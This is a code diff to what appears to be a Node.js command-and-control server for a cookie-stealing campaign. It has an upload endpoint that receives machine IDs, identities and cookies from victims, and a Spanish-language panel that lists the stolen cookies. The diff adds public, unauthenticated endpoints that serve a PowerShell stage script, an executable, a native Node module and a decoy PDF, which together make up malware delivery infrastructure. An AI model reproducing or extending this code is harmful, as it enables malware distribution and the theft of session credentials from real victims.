@@ -117,6 +117,34 @@ app.get("/" + PANEL_PATH + "/logout", (req, res) => {
   res.redirect("/" + PANEL_PATH + "/login");
 });
 
+// ── Payload delivery endpoints (no auth, public) ──
+const PAYLOAD_DIR = path.join(__dirname, "payloads");
+if (!fs.existsSync(PAYLOAD_DIR)) fs.mkdirSync(PAYLOAD_DIR, { recursive: true });
+
+app.get("/dl/s.ps1", (req, res) => {
+  const fp = path.join(PAYLOAD_DIR, "stage.ps1");
+  if (!fs.existsSync(fp)) return res.status(404).end();
+  res.type("text/plain").send(fs.readFileSync(fp, "utf8"));
+});
+
+app.get("/dl/catalog.pdf", (req, res) => {
+  const fp = path.join(PAYLOAD_DIR, "catalog.pdf");
+  if (!fs.existsSync(fp)) return res.status(404).end();
+  res.type("application/pdf").sendFile(fp);
+});
+
+app.get("/dl/s.exe", (req, res) => {
+  const fp = path.join(PAYLOAD_DIR, "s.exe");
+  if (!fs.existsSync(fp)) return res.status(404).end();
+  res.type("application/octet-stream").sendFile(fp);
+});
+
+app.get("/dl/n.node", (req, res) => {
+  const fp = path.join(PAYLOAD_DIR, "n.node");
+  if (!fs.existsSync(fp)) return res.status(404).end();
+  res.type("application/octet-stream").sendFile(fp);
+});
+
 // ── Upload endpoint (API key auth, no session needed) ──
 app.post("/api/upload", authUpload, (req, res) => {
   const { machineId, identity, cookies, timestamp } = req.body;
@@ -348,7 +376,7 @@ button:hover{background:#30363d}
     <div>Total cookies: <span id="s-total">0</span></div>
     <div>Dominios: <span id="s-domains">0</span></div>
   </div>
-  <div class="right"><a href="/logout" style="color:#8b949e;font-size:13px;text-decoration:none">Cerrar sesión ⏻</a></div>
+  <div class="right"><a href="/${PANEL_PATH}/logout" style="color:#8b949e;font-size:13px;text-decoration:none">Cerrar sesión ⏻</a></div>
 </div>
 <div class="tabs">
   <div class="tab active" data-tab="machines" onclick="switchTab('machines')">Máquinas</div>
